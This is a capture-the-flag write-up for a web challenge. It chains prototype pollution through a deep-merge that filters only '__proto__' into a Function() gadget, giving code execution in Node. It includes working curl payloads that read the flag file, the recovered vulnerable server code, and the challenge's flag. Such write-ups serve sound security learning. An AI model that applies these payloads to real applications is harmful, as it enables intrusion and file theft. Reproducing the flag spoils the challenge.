# Ouroboros

**Event:** HICyberCon CTF 2026
**Category:** web
**Flag:** `hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_d4d9ba5c06}`

---

Instance: `https://ouroboros-<hash>.chall.hiddeninvestigations.net` (rCTF, 20-min lifetime).
Flag file on the box: `/flag/flag.txt` (also `/flag.txt` symlink). Node v20.20.2, cwd `/app`.

## TL;DR - the chain

1. **Prototype pollution** via the deep-merge: it drops keys literally named `__proto__` but not a
   nested `constructor` → `settings.a.constructor.prototype` writes to `Object.prototype`.
2. The preview handler builds a **fresh empty object** `const view = {}` and reads `view.formula`
   off the prototype chain - so our PP'd `Object.prototype.formula` is seen.
3. It then runs `String(Function('data', view.formula)(locals))` - a **custom `new Function` gadget**.
   That's arbitrary JS execution in global scope, with `process` available.
4. `computed` is echoed back into the rendered HTML → we exfiltrate the flag from the response.

## The two requests

```bash
# 1) log in (any username, no password)
curl -c jar -X POST -d 'username=x' $H/api/login

# 2) prototype-pollute Object.prototype.formula  (bypasses the __proto__ filter)
curl -b jar -X POST -H 'content-type: application/json' \
  --data-raw '{"settings":{"a":{"constructor":{"prototype":{"formula":
     "return process.mainModule.require(\"fs\").readFileSync(\"/flag/flag.txt\",\"utf8\")"}}}}}' \
  $H/api/report/config

# 3) render the preview -> the evaluated result lands in <div class="computed">
curl -b jar -X POST -H 'content-type: application/json' \
  --data-raw '{"data":{"title":"T","body":"B"}}' $H/api/report/preview
```

Response:

```html
<section class="report"><h1>T</h1><small>…</small><div class="body">B</div>
<div class="computed">hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_d4d9ba5c06}</div></section>
```

## Why the obvious things were dead ends (kept for the record)

* **EJS** is ≥3.1.10: `Template`'s opts are a null-proto copy (`hasOwnOnlyObject`) and
  `shallowCopyFromList` has a `hasOwn` guard, so PP can't reach `escapeFunction` / `outputFunctionName`.
  The app uses `ejs.render(str, locals)` (2-arg), never `res.render`/`renderFile` - so the classic
  `settings['view options']` chain is unreachable too. Only EJS *delimiters* are PP-reachable.
* **Delimiter trick** (PP `openDelimiter`/`delimiter`/`closeDelimiter`) only turns literal template
  text into bare-identifier expressions; the template has no `(` `)`, so no calls → harmless.
* `computed` was never controlled by `config.*` or `data.*` - only by **prototype** pollution,
  because the app reads it from a fresh `{}` (`view`), not from `reportConfig` or `data`.
* `data.filename` reaching `path.basename` (the `path argument must be a string` error) is EJS's
  `filename` option, not an app file-read sink.
* PP `encoding` crashing every POST is `raw-body` (`'encoding' in options` walks the prototype).

## The actual sink (recovered `/app/server.js`)

```js
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__') continue;            // <-- the "already filtered" thing
    const sv = source[key];
    if (sv !== null && typeof sv === 'object' && !Array.isArray(sv)) {
      if (target[key] === null || typeof target[key] === 'undefined') target[key] = {};
      deepMerge(target[key], sv);                 // <-- constructor.prototype -> Object.prototype
    } else { target[key] = sv; }
  }
}

app.post('/api/report/preview', requireSession, (req, res) => {
  const data  = (req.body && req.body.data) || {};
  const locals = Object.assign({ title:'Untitled Report', body:'', footer: reportConfig.footer }, data);
  const view  = {};                               // <-- fresh object, inherits Object.prototype
  let computed = '';
  if (view.formula) {                             // <-- PP'd Object.prototype.formula seen here
    try { computed = String(Function('data', view.formula)(locals)); }  // <-- the gadget
    catch (e) { computed = 'formula error'; }
  }
  res.type('html').send(ejs.render(REPORT_TEMPLATE, Object.assign(locals, { computed })));
});
```

Note the `view = {}` looks like leftover scaffolding (intended to hold view options) that was never
wired up - it reads `view.formula`, and because `view` is a plain object, global prototype pollution
is enough to plant the formula. Same for the deep-merge: `Object.keys()` + a `__proto__`-only check
means `constructor.prototype` is the bypass. The challenge's "no eval" is literally false - the
gadget is `Function(...)`.
